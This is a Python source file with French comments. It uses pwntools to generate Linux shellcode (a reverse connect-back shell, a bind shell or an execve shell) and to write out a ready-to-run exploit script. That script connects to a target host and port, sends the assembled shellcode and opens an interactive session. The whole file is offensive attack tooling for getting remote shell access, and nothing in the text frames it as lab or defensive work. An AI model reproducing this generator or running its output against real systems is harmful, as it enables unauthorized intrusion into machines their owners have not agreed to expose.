def create_shellcode(context, shellcode_type, target, custom_port):
    """Génère le shellcode approprié"""
    try:
        if shellcode_type == 'shell_reverse_tcp':
            return context.shellcraft.linux.connectback(target, custom_port)
        elif shellcode_type == 'shell_bind_tcp':
            return context.shellcraft.linux.bindsh(custom_port)
        elif shellcode_type == 'execve':
            return context.shellcraft.linux.sh()
        else:
            raise ValueError("Type de shellcode non supporté")
    except Exception as e:
        raise Exception(f"Erreur de génération du shellcode: {str(e)}")

def generate_exploit_code(context, shellcode_type, target, custom_port, selected_arch):
    """Génère le code d'exploit sans dépendances Streamlit"""
    try:
        # Génération du shellcode
        shellcode = create_shellcode(context, shellcode_type, target, custom_port)
        # Assemblage du shellcode
        assembled_shellcode = context.asm(shellcode)
        
        # Template de l'exploit
        return f"""#!/usr/bin/python3
from pwn import *

# Configuration
context.arch = '{selected_arch}'
context.os = 'linux'
context.log_level = 'info'

def exploit():
    try:
        print("[+] Démarrage de l'exploit...")
        target = '{target}'
        port = {custom_port}
        
        print(f"[*] Connexion à {{target}}:{{port}}")
        r = remote(target, port)
        
        print("[*] Envoi du shellcode...")
        shellcode = {repr(assembled_shellcode)}
        r.sendline(shellcode)
        print("[+] Shellcode envoyé avec succès")
        
        r.interactive()
        
    except Exception as e:
        print(f"[-] Erreur: {{str(e)}}")
        return False
    return True

if __name__ == '__main__':
    exploit()
"""
    except Exception as e:
        raise Exception(f"Erreur de génération: {str(e)}")
